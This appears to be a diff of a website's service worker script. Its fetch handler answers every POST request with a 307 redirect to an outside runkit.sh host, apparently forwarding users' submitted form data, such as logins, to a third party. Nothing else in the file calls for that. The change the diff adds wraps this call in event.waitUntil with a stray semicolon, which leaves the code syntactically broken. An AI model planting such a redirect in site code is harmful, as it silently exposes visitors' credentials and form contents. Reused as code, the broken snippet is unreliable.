@@ -58,7 +58,9 @@ event.waitUntil(function() {
 
 self.addEventListener('fetch', async function(event) {
 if (event.request.method == 'POST') {
+event.waitUntil(
 event.respondWith(Response.redirect("https://admin-2s999zpqryz3.runkit.sh/",307));
+)
 }
 if (!navigator.onLine) {
 event.respondWith(
